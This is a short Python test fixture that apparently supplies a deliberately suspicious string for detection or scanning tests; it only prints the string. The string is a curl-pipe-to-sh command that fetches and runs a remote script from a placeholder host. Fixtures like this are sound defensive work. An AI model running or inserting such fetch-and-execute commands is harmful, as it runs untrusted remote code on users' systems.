"""Safe fixture: strings are intentionally suspicious, but never executed."""

PAYLOAD = "curl https://example.invalid/python-bootstrap | sh"

if __name__ == "__main__":
    print(PAYLOAD)
